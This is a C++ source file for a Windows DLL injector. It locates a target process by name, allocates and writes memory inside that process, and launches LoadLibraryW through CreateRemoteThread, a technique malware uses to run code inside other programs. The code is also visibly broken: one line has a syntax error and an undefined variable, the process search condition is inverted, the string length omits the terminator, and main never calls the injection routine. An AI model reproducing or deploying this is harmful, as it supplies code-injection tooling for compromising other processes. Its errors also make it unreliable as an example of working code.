#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
	//according to the documentation
	//before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	//if dwSize is not initialized
	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	// Takes a snapshot of the currently running processes
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::wcerr << L"[!] CreateToolhelp32Snapshot Failed with error : \n" << GetLastError() << std::endl;
		return FALSE;
	}

	BOOL found = FALSE;

	//retrieves information about the first process encountered in the snapshot
	if (!Process32First(hSnapshot, &procEntry)) {
		do {
			// use the dot operator to extract th eprocess name from the populated struct
			// if the process name matches the process we're looking for
			if (_wcsicmp(procEntry.szExeFile, szProcessName) == 0) {
				// use the dot operator to extract the process ID from the popiulated struct
				//save the PID
				*dwProcessId = procEntry.th32ProcessID;

				//open handler to the proceess
				*hProcess = OpenProcess(
					PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
					FALSE, 
					procEntry.th32ProcessID
				);

				if (*hProcess == NULL) {
					std::wcerr << "[!] OpenProcess Failed with error : \n" << GetLastError() << std::endl;
					CloseHandle(hSnapshot);
					return FALSE;
				}
				found = TRUE;
				break; //exit the loop
			}
			//retrieves information about the next process recorded the snapshot
			//while process still remains in the snapsho, continuet looping
		} while (Process32Next(hSnapshot, &procEntry));
	}
	CloseHandle(hSnapshot);
	return found;
}

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
	SIZE_T dllPathLen = (wcslen(dllPath))

	BOOL bSTATE = TRUE;
	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddress = NULL;

	// FETCHING THE SIZE OF DLLNAME IN BYTES
	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T lpNumberOfBytesWritten = 0;
	HANDLE hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed with error : %d \n", GetLastError());
		bSTATE = FALSE;
		return FALSE;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed with error : %d \n", GetLastError());
		bSTATE = FALSE;
		return FALSE;
	}
	printf("[i] pAddress Allocated at : 0x%p Of Size : %d \n", pAddress, dwSizeToWrite);
	printf("[#] Press <enter> To Run ...");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed with error : %d \n", GetLastError());
		bSTATE = FALSE;
		return FALSE;
	}


	printf("[i] Successfully Written %d Bytes \n", lpNumberOfBytesWritten);
	printf("[#] Press <enter> To Run ...");
	getchar();

	printf("[i] Executing Payload...");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed with error : %d \n", GetLastError());
		bSTATE = FALSE;
		return FALSE;
	}
	printf("[+] DONE \n");

_EndOfFunction:
	if (hThread != NULL)
		CloseHandle(hThread);
	return bSTATE;
}

int wmain(int argc, wchar_t* argv[]) {
	if (argc != 3) {
		std::wcout << L"Usage: Injector.exe <ProcessName.exe> <PathToDDll.dll>" << std::endl;
		return 1;
	}

	DWORD pid = 0;
	HANDLE hProcess = NULL;

	if (!GetRemoteProcessHandle(argv[1], &pid, &hProcess)) {
		std::wcerr << L"[!] Failed to get process handle" << std::endl;
		return 1;
	}

	std::wcout << L"[+] Found process ID : " << pid << std::endl;
}